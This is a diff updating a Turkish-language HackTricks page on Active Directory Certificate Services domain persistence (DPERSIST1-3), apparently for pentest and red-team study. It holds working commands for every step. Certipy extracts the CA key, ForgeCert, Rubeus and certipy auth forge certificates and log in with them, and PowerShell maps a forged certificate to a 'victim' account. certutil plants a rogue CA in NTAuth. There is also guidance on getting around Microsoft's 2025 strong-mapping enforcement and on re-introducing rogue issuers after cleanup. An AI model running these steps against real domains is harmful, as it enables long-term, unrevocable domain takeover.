@@ -1,27 +1,27 @@
-# AD CS Domain Persistence
+# AD CS Domain Kalıcılığı
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Bu, [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresinde paylaşılan alan kalıcılığı tekniklerinin bir özetidir**. Daha fazla ayrıntı için kontrol edin.
+**Bu, [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresinde paylaşılan domain kalıcılığı tekniklerinin bir özetidir.** Daha fazla detay için kontrol edin.
 
-## Çalınan CA Sertifikaları ile Sertifika Sahteciliği - DPERSIST1
+## Çalıntı CA Sertifikalarıyla Sertifika Üretme - DPERSIST1
 
 Bir sertifikanın CA sertifikası olduğunu nasıl anlarsınız?
 
-Bir sertifikanın CA sertifikası olduğu, birkaç koşulun sağlanmasıyla belirlenebilir:
+Bir sertifikanın CA sertifikası olduğu, birkaç koşul sağlandığında belirlenebilir:
 
-- Sertifika, CA sunucusunda depolanır ve özel anahtarı makinenin DPAPI'si veya işletim sistemi destekliyorsa TPM/HSM gibi donanım tarafından korunur.
-- Sertifikanın Hem Verici (Issuer) hem de Konu (Subject) alanları CA'nın ayırt edici adıyla eşleşir.
-- "CA Version" uzantısı yalnızca CA sertifikalarında mevcuttur.
-- Sertifikada Genişletilmiş Anahtar Kullanımı (EKU) alanları yoktur.
+- Sertifika CA sunucusunda depolanır; özel anahtarı makinenin DPAPI'si tarafından veya işletim sistemi destekliyorsa TPM/HSM gibi donanım tarafından korunur.
+- Sertifikanın Issuer ve Subject alanlarının her ikisi de CA'nın distinguished name'i ile eşleşir.
+- Sadece CA sertifikalarında bulunan bir "CA Version" uzantısı mevcuttur.
+- Sertifika Extended Key Usage (EKU) alanlarından yoksundur.
 
-Bu sertifikanın özel anahtarını çıkarmak için, CA sunucusundaki `certsrv.msc` aracı, yerleşik GUI aracılığıyla desteklenen yöntemdir. Ancak, bu sertifika sistemde depolanan diğerlerinden farklı değildir; bu nedenle, [THEFT2 tekniği](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) gibi yöntemler çıkarım için uygulanabilir.
+Bu sertifikanın özel anahtarını çıkarmak için CA sunucusundaki `certsrv.msc` aracı, yerleşik GUI aracılığıyla desteklenen yöntemdir. Yine de, bu sertifika sistemde depolanan diğerlerinden farklı değildir; bu nedenle çıkarma için [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) gibi yöntemler uygulanabilir.
 
-Sertifika ve özel anahtar, aşağıdaki komut ile Certipy kullanılarak da elde edilebilir:
+Sertifika ve özel anahtar ayrıca Certipy kullanılarak şu komutla elde edilebilir:
 ```bash
 certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
 ```
-CA sertifikası ve özel anahtarını `.pfx` formatında edindikten sonra, geçerli sertifikalar oluşturmak için [ForgeCert](https://github.com/GhostPack/ForgeCert) gibi araçlar kullanılabilir:
+CA sertifikası ve özel anahtarını `.pfx` formatında elde ettikten sonra, [ForgeCert](https://github.com/GhostPack/ForgeCert) gibi araçlar geçerli sertifikalar oluşturmak için kullanılabilir:
 ```bash
 # Generating a new certificate with ForgeCert
 ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!
@@ -36,28 +36,72 @@ Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /pa
 certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
 ```
 > [!WARNING]
-> Sertifika sahteciliği hedeflenen kullanıcının aktif olması ve Active Directory'de kimlik doğrulama yapabilme yeteneğine sahip olması gerekmektedir. krbtgt gibi özel hesaplar için sertifika sahteciliği etkisizdir.
+> Sertifika sahtekarlığına hedeflenen kullanıcı, işlemin başarılı olması için Active Directory'de aktif olmalı ve kimlik doğrulaması yapabilecek durumda olmalıdır. krbtgt gibi özel hesaplar için sertifika düzenlemek etkisizdir.
 
-Bu sahte sertifika, belirtilen son tarihine kadar **geçerli** olacak ve **kök CA sertifikası geçerli olduğu sürece** (genellikle 5 ila **10+ yıl** arasında) geçerliliğini koruyacaktır. Ayrıca, **makineler** için de geçerlidir, bu nedenle **S4U2Self** ile birleştirildiğinde, bir saldırgan **CA sertifikası geçerli olduğu sürece** herhangi bir alan makinesinde **kalıcılığı sürdürebilir**.\
-Ayrıca, bu yöntemle **oluşturulan sertifikalar** **iptal edilemez** çünkü CA bunlardan haberdar değildir.
+Bu sahte sertifika, belirtilen bitiş tarihine kadar ve root CA sertifikası geçerli olduğu sürece (genellikle 5 ila **10+ yıl**) **geçerli** olacaktır. Ayrıca **makineler** için de geçerlidir, bu yüzden **S4U2Self** ile birleştirildiğinde bir saldırgan CA sertifikası geçerli olduğu sürece herhangi bir domain makinesinde **persistence** sürdürebilir.\ Ayrıca, bu yöntemle oluşturulan **sertifikalar** CA tarafından haberdar edilmediği için **iptal edilemez**.
+
+### Strong Certificate Mapping Enforcement (2025+) altında çalışma
+
+11 Şubat 2025'ten itibaren (KB5014754 dağıtımından sonra), domain controllers varsayılan olarak sertifika eşlemeleri için **Full Enforcement** modunu kullanır. Pratikte bu, sahte sertifikalarınızın ya şunlardan biri olması gerektiği anlamına gelir:
+
+- Hedef hesaba güçlü bir bağlama içermeli (örneğin, SID security extension), veya
+- Hedef nesnenin `altSecurityIdentities` attribute'unda güçlü, açık bir eşleme ile eşleştirilmiş olmalı.
+
+Persistence için güvenilir bir yaklaşım, çalınmış Enterprise CA'ya zincirlenmiş sahte bir sertifika düzenlemek ve ardından mağdur principal'a güçlü, açık bir eşleme eklemektir:
+```powershell
+# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
+$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
+$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
+$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
+Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
+```
+Notlar
+- Eğer SID güvenlik uzantısını içeren sahte sertifikalar oluşturabiliyorsanız, bunlar Full Enforcement altında bile örtük olarak eşlenecektir. Aksi takdirde, açık güçlü eşlemeleri tercih edin. Açık eşlemeler hakkında daha fazla bilgi için [account-persistence](account-persistence.md) bakın.
+- İptal işlemi savunmacılara burada yardımcı olmaz: sahte sertifikalar CA veritabanında bilinmediğinden iptal edilemez.
 
 ## Sahte CA Sertifikalarına Güvenme - DPERSIST2
 
-`NTAuthCertificates` nesnesi, Active Directory'nin (AD) kullandığı `cacertificate` niteliği içinde bir veya daha fazla **CA sertifikası** içerecek şekilde tanımlanmıştır. **Alan denetleyicisi** tarafından yapılan doğrulama süreci, kimlik doğrulama **sertifikasının** İhraççı alanında belirtilen **CA ile** eşleşen bir girişi kontrol etmeyi içerir. Eşleşme bulunursa kimlik doğrulama devam eder.
+`NTAuthCertificates` nesnesi, Active Directory (AD) tarafından kullanılan `cacertificate` özniteliği içinde bir veya daha fazla **CA certificates** içerecek şekilde tanımlanmıştır. Doğrulama süreci **domain controller** tarafından, kimlik doğrulayan **certificate**'ın Issuer alanında belirtilen **CA specified** ile eşleşen bir giriş olup olmadığını `NTAuthCertificates` nesnesinde kontrol etmeyi içerir. Eşleşme bulunursa kimlik doğrulama devam eder.
 
-Bir saldırgan, bu AD nesnesi üzerinde kontrol sahibi olduğu sürece `NTAuthCertificates` nesnesine kendinden imzalı bir CA sertifikası ekleyebilir. Normalde, yalnızca **Enterprise Admin** grubunun üyeleri ile **Domain Admins** veya **orman kök alanındaki** **Yönetici** grubu bu nesneyi değiştirme iznine sahiptir. `NTAuthCertificates` nesnesini `certutil.exe` kullanarak `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA126` komutuyla veya [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) kullanarak düzenleyebilirler.
+Bir saldırgan, bu AD nesnesi üzerinde kontrole sahipse `NTAuthCertificates` nesnesine self-signed bir CA sertifikası ekleyebilir. Normalde, yalnızca **Enterprise Admin** grubunun üyeleri ile **Domain Admins** veya **Administrators**'ın **forest root’s domain** içindeki üyeleri bu nesneyi değiştirme iznine sahiptir. `NTAuthCertificates` nesnesini `certutil.exe` ile `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` komutunu kullanarak ya da [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) aracını kullanarak düzenleyebilirler.
 
-Bu yetenek, daha önce belirtilen ForgeCert yöntemini kullanarak dinamik olarak sertifikalar oluşturmak için kullanıldığında özellikle önemlidir.
+Bu teknik için faydalı ek komutlar:
+```bash
+# Add/remove and inspect the Enterprise NTAuth store
+certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
+certutil -enterprise -viewstore NTAuth
+certutil -enterprise -delstore NTAuth <Thumbprint>
+
+# (Optional) publish into AD CA containers to improve chain building across the forest
+certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
+certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
+```
+Bu yetenek, ForgeCert kullanılarak dinamik olarak sertifika oluşturmayı içeren daha önce açıklanmış bir yöntemle birlikte kullanıldığında özellikle önemlidir.
+
+> Post-2025 eşleme hususları: bir rogue CA'yı NTAuth içine yerleştirmek yalnızca yayımlayan CA'ya güven oluşturur. DC'ler **Full Enforcement** durumundayken leaf sertifikaları ile oturum açmak için leaf ya SID güvenlik uzantısını içermeli ya da hedef nesnede güçlü, açık bir eşleme bulunmalıdır (örneğin Issuer+Serial `altSecurityIdentities`). Bkz. {{#ref}}account-persistence.md{{#endref}}.
 
 ## Kötü Amaçlı Yanlış Yapılandırma - DPERSIST3
 
-AD CS bileşenlerinin **güvenlik tanımlayıcıları** üzerinde **kalıcılık** sağlama fırsatları bolca mevcuttur. "[Domain Escalation](domain-escalation.md)" bölümünde açıklanan değişiklikler, yükseltilmiş erişime sahip bir saldırgan tarafından kötü niyetle uygulanabilir. Bu, aşağıdaki gibi hassas bileşenlere "kontrol hakları" (örneğin, WriteOwner/WriteDACL/ vb.) eklenmesini içerir:
+AD CS bileşenlerinin güvenlik tanımlayıcısı (security descriptor) değişiklikleri yoluyla **persistence** fırsatları bol miktarda mevcuttur. "[Domain Escalation](domain-escalation.md)" bölümünde açıklanan değişiklikler, domaine yükseltilmiş erişimi olan bir saldırgan tarafından kötü amaçla uygulanabilir. Bu, aşağıdaki gibi hassas bileşenlere "control rights" (ör. WriteOwner/WriteDACL/etc.) eklemeyi içerir:
 
-- **CA sunucusunun AD bilgisayar** nesnesi
-- **CA sunucusunun RPC/DCOM sunucusu**
-- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** içindeki herhangi bir **torun AD nesnesi veya konteyner** (örneğin, Sertifika Şablonları konteyneri, Sertifikasyon Otoriteleri konteyneri, NTAuthCertificates nesnesi vb.)
-- **AD gruplarının AD CS'yi kontrol etme hakları** varsayılan olarak veya organizasyon tarafından (örneğin, yerleşik Sertifika Yayıncıları grubu ve üyeleri)
+- **CA server’s AD computer** nesnesi
+- **CA server’s RPC/DCOM server**
+- **CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>** içinde herhangi bir **alt AD nesnesi veya container** (ör. Certificate Templates container, Certification Authorities container, NTAuthCertificates object vb.)
+- Varsayılan veya organizasyon tarafından AD CS'yi kontrol etme hakları delege edilen **AD grupları** (ör. built-in Cert Publishers grubu ve üyeleri)
 
-Kötü niyetli bir uygulama örneği, alan içinde **yükseltilmiş izinlere** sahip bir saldırganın, **`User`** sertifika şablonuna **`WriteOwner`** iznini eklemesi olacaktır; burada saldırgan, bu hakkın sahibi olur. Bunu istismar etmek için, saldırgan önce **`User`** şablonunun sahipliğini kendisine değiştirecektir. Ardından, **`mspki-certificate-name-flag`** şablon üzerinde **1** olarak ayarlanacak ve **`ENROLLEE_SUPPLIES_SUBJECT`** etkinleştirilecektir; bu, bir kullanıcının talepte bir Subject Alternative Name sağlamasına olanak tanır. Sonrasında, saldırgan **şablonu** kullanarak, alternatif bir ad olarak bir **alan yöneticisi** adı seçerek **kayıt** olabilir ve elde edilen sertifikayı DA olarak kimlik doğrulama için kullanabilir.
+Kötü amaçlı bir uygulama örneğinde, domain içinde **yükseltilmiş izinleri** olan bir saldırgan, varsayılan **`User`** sertifika şablonuna **`WriteOwner`** iznini ekleyebilir ve bu hakkın sahibi olarak kendisini atayabilir. Bunu istismar etmek için saldırgan önce **`User`** şablonunun sahipliğini kendine geçirir. Ardından şablonda **`mspki-certificate-name-flag`** 1 olarak ayarlanır ve böylece **`ENROLLEE_SUPPLIES_SUBJECT`** etkinleştirilir; bu, istekte Subject Alternative Name sağlanmasına izin verir. Takiben saldırgan, şablonu kullanarak **enroll** olur, alternatif ad olarak bir **domain administrator** ismi seçer ve elde ettiği sertifikayı DA olarak kimlik doğrulama için kullanır.
 
+Saldırganların uzun vadeli domain persistence için ayarlayabileceği pratik kontroller (tam detaylar ve tespit için bkz. {{#ref}}domain-escalation.md{{#endref}}):
+
+- İstek sahiplerinden SAN kabul eden CA politika bayrakları (ör. `EDITF_ATTRIBUTESUBJECTALTNAME2` etkinleştirilmesi). Bu, ESC1-like yolların istismar edilebilir kalmasını sağlar.
+- Kimlik doğrulamaya uygun düzenlemeye izin veren şablon DACL veya ayarları (ör. Client Authentication EKU eklemek, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkinleştirmek).
+- Savunucular temizlemeye çalışsa bile rogue yayımlayıcıları sürekli yeniden tanıtmak için `NTAuthCertificates` nesnesi veya CA container'larını kontrol etme.
+
+> [!TIP]
+> KB5014754 sonrası sertleştirilmiş ortamlarda, bu yanlış yapılandırmaları açık, güçlü eşlemeler (`altSecurityIdentities`) ile eşleştirmek, DC'ler güçlü eşlemeyi uygulasalar bile verdiğiniz veya sahtelediğiniz sertifikaların kullanılabilir kalmasını sağlar.
+
+## Kaynaklar
+
+- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
+- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
 {{#include ../../../banners/hacktricks-training.md}}
